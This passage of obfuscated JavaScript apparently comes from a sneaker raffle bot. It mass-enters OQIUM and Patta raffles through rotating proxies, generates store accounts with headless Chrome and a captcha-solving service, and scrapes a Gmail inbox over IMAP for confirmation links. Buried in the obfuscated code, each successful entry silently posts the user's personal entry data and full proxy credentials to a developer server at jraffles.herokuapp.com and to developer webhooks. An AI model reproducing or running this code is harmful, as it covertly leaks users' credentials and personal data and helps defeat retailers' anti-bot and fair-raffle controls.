                                'proxy': 'http://' + _0x5ed3e7[0x2] + ':' + _0x5ed3e7[0x3] + '@' + _0x5ed3e7[0x0] + ':' + _0x5ed3e7[0x1]
                            };
                            return _0x579d1f != 'ver' && (_0x415b47['url'] = _0x257d50['url'], _0x415b47['headers'] = _0x257d50['headers']), _0x579d1f == 'ver' && (_0x415b47['method'] = 'GET'), new Promise(function (_0x2513ea, _0x52d0cb) {
                                callback = async (_0x309fdf, _0xf856ec, _0x35ca9d) => {
                                    if (!_0x309fdf && _0xf856ec['statusCode'] == 0xca || !_0x309fdf && _0xf856ec['statusCode'] == 0xc8) {
                                        if (_0x579d1f != 'ver') {
                                            var _0x368310 = await _0x262703(_0x2475b4[_0x261351], _0x257d50, 'dev', ![]), _0x259606 = await _0x262703(_0x2475b4[_0x261351], _0x257d50, 'pub', ![]);
                                            const _0x572e29 = {
                                                'succesDEVMSG': { 'embeds': [_0x368310] },
                                                'succesPUBMSG': { 'embeds': [_0x259606] }
                                            };
                                            let _0x212b0e = _0x2475b4[_0x261351];
                                            try {
                                                prxdata = {
                                                    'username': _0x25f505['replace']('#', ''),
                                                    'module': _0x257d50['name'],
                                                    'entrydata': JSON['stringify'](_0x212b0e),
                                                    'proxy': '' + _0x5ddec5[_0x261351]
                                                };
                                                var _0x13ca08 = JSON['stringify'](prxdata);
                                                let _0xd20a2c = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x13ca08, _0xd20a2c);
                                            } catch (_0x1e4a2a) {
                                            }
                                            if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                                                try {
                                                    await _0x17b782(_0x395552['webhook'], _0x572e29['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x572e29['succesDEVMSG']), await _0x17175c(0xc8);
                                            try {
                                                await _0x17b782(_0xd9f2b8, _0x572e29['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x12263c(_0x2475b4[_0x261351], _0x257d50);
                                        }
                                        _0x2513ea(console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x257d50['name'] + ']\x20Task\x20' + (_0x261351 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x579d1f != 'ver') {
                                            var _0x185c0d = '' + _0x309fdf, _0x4dd4ab = await _0x262703(_0x2475b4[_0x261351], _0x257d50, 'dev', !![], _0x185c0d), _0x4c8058 = {};
                                            _0x4c8058['errorDEV'] = { 'embeds': [_0x4dd4ab] }, _0x2848bf(_0x2475b4[_0x261351], _0x257d50), _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x4c8058['errorDEV']), await _0x17b782(_0x40c5c7, _0x4c8058['errorDEV']);
                                        }
                                        _0x52d0cb(console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x257d50['name'] + ']\x20Task\x20' + (_0x261351 + 0x1) + ':\x20' + _0x309fdf)));
                                    }
                                };
                                try {
                                    _0x579d1f != 'ver' && console['log'](_0x34a417() + '\x20[' + _0x257d50['name'] + ']\x20Task\x20' + (_0x261351 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x276bb3['data']['attributes']['email']), _0x1c9afe(_0x415b47, callback);
                                } catch (_0x5cfa2e) {
                                    console['log'](_0x34a417() + '\x20Task\x20' + (_0x261351 + 0x1) + ':\x20' + _0x5cfa2e);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x56854d(_0x1c527e, 'nor', _0x16218a, _0x274f90, _0x242d11), console['log'](_0x34a417() + '\x20[' + _0x16218a['name'] + ']\x20Sleeping\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        } catch (_0x81586) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x33c596, _0x28032b, _0x509c88) {
                    var _0x28032b = [], _0x950d14 = ![];
                    async function _0x58817b() {
                        var _0x26fac5 = new _0x550e5b({
                            'user': _0x395552['masterMail'],
                            'password': _0x395552['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x28c480(_0xc701ce) {
                            _0x26fac5['openBox']('INBOX', ![], _0xc701ce);
                        }
                        _0x26fac5['once']('ready', function () {
                            _0x28c480(function (_0x3cbd03, _0x49ef4b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3cbd03)
                                    throw _0x3cbd03;
                                _0x26fac5['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x27846b, _0x5e5ddf) {
                                    if (!_0x5e5ddf || !_0x5e5ddf['length'])
                                        console['log'](_0x34a417() + '\x20[' + _0x33c596['name'] + ']\x20No\x20mails\x20found'), _0x26fac5['end']();
                                    else {
                                        var _0xcc2e77 = _0x26fac5['seq']['fetch'](_0x5e5ddf, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xcc2e77['on']('message', function (_0xaed1a1, _0xaa0c89) {
                                            var _0x44141c = '(#' + _0xaa0c89 + ')\x20';
                                            _0xaed1a1['on']('body', function (_0x4b4987, _0x48a166) {
                                                _0x169414(_0x4b4987, (_0x2a596b, _0x23fc57) => {
                                                    var _0x2dc9ef = _0x23fc57['text']['split']('(')[0x1], _0x5a422d = _0x2dc9ef['split'](')')[0x0];
                                                    _0x28032b['push'](_0x5a422d);
                                                });
                                            }), _0xaed1a1['once']('end', function () {
                                            });
                                        }), _0xcc2e77['once']('error', function (_0x5cbd18) {
                                            console['log']('Fetch\x20error:\x20' + _0x5cbd18), _0x950d14 = !![];
                                        }), _0xcc2e77['once']('end', function () {
                                            _0x26fac5['end'](), _0x950d14 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x26fac5['once']('error', function (_0x4a920d) {
                            console['log'](_0x4a920d), _0x950d14 = !![];
                        }), _0x26fac5['once']('end', async function () {
                            _0x950d14 = !![];
                        }), _0x26fac5['connect']();
                    }
                    async function _0x33725d(_0x557691, _0x5049a7, _0x16d5f6) {
                        for (var _0x3d43f9 = 0x0; _0x3d43f9 < _0x5049a7['length']; _0x3d43f9++) {
                            async function _0x1f449b(_0x5342cc, _0xd33cd5, _0x1ad1e0, _0x1a721c, _0x595a9c) {
                                var _0x25543c, _0x1445f3 = {}, _0x23473e = [], _0x1013af = {}, _0x537fbd = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x46481e = Math['round'](Math['random']() * (_0x537fbd['length'] - 0x1));
                                _0x1a721c[_0x5342cc]['Size'] == 'RANDOM' && (_0x1a721c[_0x5342cc]['Size'] = _0x537fbd[_0x46481e]);
                                !_0x1a721c && (_0x1a721c = {});
                                if (_0x395552['useRandomProxy'] = ![])
                                    var _0xba1852 = _0x595a9c[_0x5342cc]['split'](':');
                                else
                                    var _0x57423c = Math['round'](Math['random']() * (_0x595a9c['length'] - 0x1)), _0xba1852 = _0x595a9c[_0x57423c]['split'](':');
                                var _0x8a0a90 = {
                                    'jar': _0x406b27,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1ad1e0['url'],
                                    'headers': _0x1ad1e0['headers'],
                                    'body': JSON['stringify'](_0x1445f3),
                                    'proxy': 'http://' + _0xba1852[0x2] + ':' + _0xba1852[0x3] + '@' + _0xba1852[0x0] + ':' + _0xba1852[0x1]
                                };
                                return _0xd33cd5 != 'ver' && (_0x8a0a90['url'] = _0x1ad1e0['url'], _0x8a0a90['headers'] = _0x1ad1e0['headers']), _0xd33cd5 == 'ver' && (_0x8a0a90['method'] = 'GET', _0x8a0a90['url'] = _0x1a721c[_0x5342cc]), new Promise(function (_0x1aac01, _0x2227f1) {
                                    callback = async (_0x42de0d, _0x1deaef, _0xf15657) => {
                                        if (!_0x42de0d && _0x1deaef['statusCode'] == 0xca || !_0x42de0d && _0x1deaef['statusCode'] == 0xc8) {
                                            if (_0xd33cd5 != 'ver') {
                                                var _0x2e3f77 = await _0x262703(_0x1a721c[_0x5342cc], _0x1ad1e0, 'dev', ![]), _0xc52bd6 = await _0x262703(_0x1a721c[_0x5342cc], _0x1ad1e0, 'pub', ![]);
                                                const _0x44808f = {
                                                    'succesDEVMSG': { 'embeds': [_0x2e3f77] },
                                                    'succesPUBMSG': { 'embeds': [_0xc52bd6] }
                                                };
                                                if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                                                    try {
                                                        await _0x17b782(_0x395552['webhook'], _0x44808f['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x44808f['succesDEVMSG']), await _0x17175c(0xc8);
                                                try {
                                                    await _0x17b782(_0xd9f2b8, _0x44808f['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x12263c(_0x1a721c[_0x5342cc], _0x1ad1e0);
                                            }
                                            _0x1aac01(console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x1ad1e0['name'] + ']\x20Task\x20' + (_0x5342cc + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0xd33cd5 != 'ver') {
                                                var _0x4b4029 = '' + _0x42de0d, _0x4cfabf = await _0x262703(_0x1a721c[_0x5342cc], _0x1ad1e0, 'dev', !![], _0x4b4029), _0x4f9de1 = {};
                                                _0x4f9de1['errorDEV'] = { 'embeds': [_0x4cfabf] }, _0x2848bf(_0x1a721c[_0x5342cc], _0x1ad1e0), _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x4f9de1['errorDEV']), await _0x17b782(_0x40c5c7, _0x4f9de1['errorDEV']);
                                            }
                                            _0x2227f1(console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x1ad1e0['name'] + ']\x20Task\x20' + (_0x5342cc + 0x1) + ':\x20' + _0x42de0d)));
                                        }
                                    };
                                    try {
                                        _0xd33cd5 != 'ver' ? console['log'](_0x34a417() + '\x20[' + _0x1ad1e0['name'] + ']\x20Task\x20' + (_0x5342cc + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1445f3['data']['attributes']['email']) : console['log'](_0x34a417() + '\x20[' + _0x1ad1e0['name'] + ']\x20Task\x20' + (_0x5342cc + 0x1) + ':\x20Fetching\x20Response'), _0x1c9afe(_0x8a0a90, callback);
                                    } catch (_0x5907a0) {
                                        console['log'](_0x34a417() + '\x20Task\x20' + (_0x5342cc + 0x1) + ':\x20' + _0x5907a0);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1f449b(_0x3d43f9, 'ver', _0x557691, _0x5049a7, _0x16d5f6), console['log'](_0x34a417() + '\x20[' + _0x557691['name'] + ']\x20Sleeping\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                            } catch (_0x602c4b) {
                            }
                        }
                    }
                    try {
                        _0x58817b();
                        while (!_0x950d14) {
                            await _0x17175c(0xfa0);
                        }
                        console['log']('Found\x20' + _0x28032b['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x33725d(_0x33c596, _0x28032b, _0x509c88);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3a00ba, _0x3c3eb8, _0x46505f) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x16c36a = 0x0; _0x16c36a < _0x3c3eb8['length']; _0x16c36a++) {
                        var _0x34527b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x25f505
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x395552['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5e7c75
                                }
                            ]
                        }];
                        const _0x7395cc = { 'embeds': _0x34527b };
                        _0xe0def5(_0x3a00ba['name'] + '\x20Task\x20' + (_0x16c36a + 0x1) + '\x20/\x20' + _0x3c3eb8['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        try {
                            await _0x195de7(_0x3c3eb8, _0x16c36a);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4e946c = await _0x262703(_0x3c3eb8[_0x16c36a], _0x3a00ba, 'acc', ![]);
                        const _0x532c71 = { 'succesDEVMSG': { 'embeds': [_0x4e946c] } };
                        if (_0x3c3eb8[_0x16c36a]['Email'] == '' || _0x3c3eb8[_0x16c36a]['FirstName'] == '' || _0x3c3eb8[_0x16c36a]['LastName'] == '') {
                            console['log'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x16c36a + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x17175c(0x7d0);
                            continue;
                        }
                        (_0x3c3eb8[_0x16c36a]['Password'] == '' || _0x3c3eb8[_0x16c36a] == undefined) && _0x3c3eb8[_0x16c36a]['Password'] == 'JRaffles23!';
                        if (_0x395552['useRandomProxy'] = ![])
                            var _0x2d00aa = _0x46505f[_0x16c36a]['split'](':');
                        else
                            var _0x15363e = Math['round'](Math['random']() * (_0x46505f['length'] - 0x1)), _0x2d00aa = _0x46505f[_0x15363e]['split'](':');
                        var _0x2a1339;
                        try {
                            _0x2a1339 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d00aa[0x0] + ':' + _0x2d00aa[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2a1339 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d00aa[0x0] + ':' + _0x2d00aa[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x26f6a9 = await _0x2a1339['newPage']();
                            await _0x26f6a9['authenticate']({
                                'username': '' + _0x2d00aa[0x2],
                                'password': '' + _0x2d00aa[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x3a00ba['name'] + ']\x20Task\x20' + (_0x16c36a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26f6a9['setRequestInterception'](!![]), _0x26f6a9['on']('request', _0x1667e2 => {
                                _0x1667e2['resourceType']() === 'image' || _0x1667e2['resourceType']() === 'font' || _0x1667e2['resourceType']() === 'media' ? _0x1667e2['abort']() : _0x1667e2['continue']();
                            }), await _0x26f6a9['goto']('https://patta.nl/account/register'), await _0x17175c(0xbb8), await _0x26f6a9['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x34a417() + '\x20[' + _0x3a00ba['name'] + ']\x20Task\x20' + (_0x16c36a + 0x1) + '\x20:\x20Filling\x20information'), await _0x26f6a9['type']('#RegisterForm-FirstName', '' + _0x3c3eb8[_0x16c36a]['FirstName']), await _0x17175c(0x226), await _0x26f6a9['type']('#RegisterForm-LastName', '' + _0x3c3eb8[_0x16c36a]['LastName']), await _0x17175c(0x226), await _0x26f6a9['type']('#RegisterForm-email', '' + _0x3c3eb8[_0x16c36a]['Email']), await _0x17175c(0x226), await _0x26f6a9['type']('#RegisterForm-password', '' + _0x3c3eb8[_0x16c36a]['Password']), await _0x17175c(0x226), console['log'](_0x34a417() + '\x20[' + _0x3a00ba['name'] + ']\x20Task\x20' + (_0x16c36a + 0x1) + '\x20:\x20Submitting..'), await _0x26f6a9['$eval']('#RegisterForm', _0x73e0d8 => _0x73e0d8['submit']()), await _0x17175c(0x1f40);
                            try {
                                await _0x26f6a9['waitForSelector']('.home-page-grid__collection'), await _0x17175c(0x1f4), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x3a00ba['name'] + ']\x20Task\x20' + (_0x16c36a + 0x1) + '\x20:\x20Account\x20' + _0x3c3eb8[_0x16c36a]['Email'] + '\x20Generated!')), _0x2e1301['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x3c3eb8[_0x16c36a]['Email'] + ',' + _0x3c3eb8[_0x16c36a]['Password']), console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0x3a00ba['name'] + ']\x20Task\x20' + (_0x16c36a + 0x1) + '\x20:\x20Account\x20' + _0x3c3eb8[_0x16c36a]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x532c71['succesDEVMSG']);
                                } catch {
                                }
                                await _0x17b782(_0x30a02b, _0x532c71['succesDEVMSG']);
                            } catch (_0x10b439) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x16c36a + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x10b439));
                            }
                        } catch (_0x6ad784) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x16c36a + 0x1) + '\x20:\x20' + _0x6ad784));
                        } finally {
                            _0x2a1339 && _0x2a1339['close'](), console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x37d240, _0x5d6d13, _0x48e538) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x366ae9 = 0x0; _0x366ae9 < _0x5d6d13['length']; _0x366ae9++) {
                        var _0x5ef79d;
                        if (_0x39083f != 'yes')
                            var _0x39083f = '', _0x22e632 = 0x0;
                        _0xe0def5(_0x37d240['name'] + '\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20/\x20' + _0x5d6d13['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        try {
                            await _0x195de7(_0x5d6d13, _0x366ae9);
                        } catch {
                            _0x39083f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5d6d13[_0x366ae9]['Email'] == '' || _0x5d6d13[_0x366ae9]['Password'] == '' || _0x5d6d13[_0x366ae9]['FirstName'] == '' || _0x5d6d13[_0x366ae9]['LastName'] == '') {
                            console['log'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x395552['useRandomProxy'] = ![])
                            var _0x27588d = _0x48e538[_0x366ae9]['split'](':');
                        else
                            var _0x50ee6d = Math['round'](Math['random']() * (_0x48e538['length'] - 0x1)), _0x27588d = _0x48e538[_0x50ee6d]['split'](':');
                        var _0x125715;
                        try {
                            _0x125715 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x27588d[0x0] + ':' + _0x27588d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x125715 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x27588d[0x0] + ':' + _0x27588d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xe4c6db = await _0x125715['newPage']();
                            await _0xe4c6db['authenticate']({
                                'username': '' + _0x27588d[0x2],
                                'password': '' + _0x27588d[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xe4c6db['setRequestInterception'](!![]), _0xe4c6db['on']('request', _0x650872 => {
                                _0x650872['resourceType']() === 'image' || _0x650872['resourceType']() === 'font' || _0x650872['resourceType']() === 'media' ? _0x650872['abort']() : _0x650872['continue']();
                            }), await _0xe4c6db['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xe4c6db['waitForSelector']('#CustomerEmail'), console['log'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Logging\x20in..'), await _0xe4c6db['type']('#CustomerEmail', '' + _0x5d6d13[_0x366ae9]['Email']), await _0x17175c(0x12c), await _0xe4c6db['type']('#CustomerPassword', '' + _0x5d6d13[_0x366ae9]['Password']), await _0x17175c(0x226), await _0xe4c6db['$eval']('#customer_login', _0x14bb64 => _0x14bb64['submit']());
                            try {
                                await _0xe4c6db['waitForSelector']('#orders'), await _0x17175c(0x4b0);
                            } catch {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0xe4c6db['goto']('' + _0x5d6d13[_0x366ae9]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x17175c(0xbb8), console['log'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0xe4c6db['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0xe4c6db['type']('#email', '' + _0x5d6d13[_0x366ae9]['Email']), await _0x17175c(0x384), await _0xe4c6db['type']('#first_name', '' + _0x5d6d13[_0x366ae9]['FirstName']), await _0x17175c(0x514), await _0xe4c6db['type']('#last_name', '' + _0x5d6d13[_0x366ae9]['LastName']), await _0x17175c(0x514), await _0xe4c6db['type']('#street_address', _0x5d6d13[_0x366ae9]['Address1'] + '\x20' + _0x5d6d13[_0x366ae9]['HouseNumber'] + '\x20' + _0x5d6d13[_0x366ae9]['Address2']), await _0x17175c(0x2bc);
                            _0x5d6d13[_0x366ae9]['Postcode'] == undefined && (_0x5d6d13[_0x366ae9]['Postcode'] = _0x5d6d13[_0x366ae9]['Zip']);
                            await _0xe4c6db['type']('#zip_code', '' + _0x5d6d13[_0x366ae9]['Postcode']), await _0x17175c(0x320), await _0xe4c6db['type']('#city', '' + _0x5d6d13[_0x366ae9]['City']), await _0x17175c(0x320), await _0xe4c6db['type']('#bday', '01/01/1994'), await _0x17175c(0x320), await _0xe4c6db['type']('#instagram', '' + _0x5d6d13[_0x366ae9]['Follower']), await _0x17175c(0x352);
                            if (_0x5d6d13[_0x366ae9]['Size'] == 'RANDOM') {
                                const _0x7fc983 = await _0xe4c6db['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xac4c42 => {
                                    return _0xac4c42['map'](_0x410d91 => _0x410d91['textContent']);
                                });
                                var _0x116b9c = Math['round'](Math['random']() * (_0x7fc983['length'] - 0x1));
                                console['log'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x7fc983[_0x116b9c]), await _0xe4c6db['click']('label[data-eu-size=\x22' + _0x7fc983[_0x116b9c] + '\x22]');
                            } else {
                                console['log'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x5d6d13[_0x366ae9]['Size']);
                                try {
                                    await _0xe4c6db['click']('label[data-eu-size=\x22' + _0x5d6d13[_0x366ae9]['Size'] + '\x22]');
                                } catch {
                                    await _0xe4c6db['click']('label[data-eu-size=\x22' + _0x5d6d13[_0x366ae9]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x17175c(0xbb8), await _0xe4c6db['$$eval']('.raffle__checkbox-label', _0xbb1d28 => _0xbb1d28['forEach'](_0x37e514 => _0x37e514['click']())), await _0x17175c(0x7d0), console['log'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xe4c6db['click']('#raffle__form-submit'), await _0x17175c(0x1388);
                            try {
                                await _0xe4c6db['waitForSelector']('#raffle__confirmation-message-container'), _0x39083f = 'no', _0x12263c(_0x5d6d13[_0x366ae9], _0x37d240), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0xd086ef = _0x5d6d13[_0x366ae9];
                                try {
                                    prxdata = {
                                        'username': _0x25f505['replace']('#', ''),
                                        'module': _0x37d240['name'],
                                        'entrydata': JSON['stringify'](_0xd086ef),
                                        'proxy': '' + _0x48e538[_0x366ae9]
                                    };
                                    var _0x5057f5 = JSON['stringify'](prxdata);
                                    let _0x30c76a = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x5057f5, _0x30c76a);
                                } catch (_0x12b4c0) {
                                }
                            } catch (_0x14c87a) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x14c87a));
                            }
                        } catch (_0x493a95) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20' + _0x493a95)), _0x39083f = 'yes';
                        } finally {
                            _0x125715 && _0x125715['close']();
                            if (_0x39083f == 'yes' && _0x22e632 != 0x5 && _0x5ef79d != 'Size\x20Not\x20Found') {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x37d240['name'] + ']\x20Task\x20' + (_0x366ae9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x22e632 + '\x20/\x205)')), _0x366ae9 = _0x366ae9 - 0x1, _0x22e632 = _0x22e632 + 0x1;
                                continue;
                            }
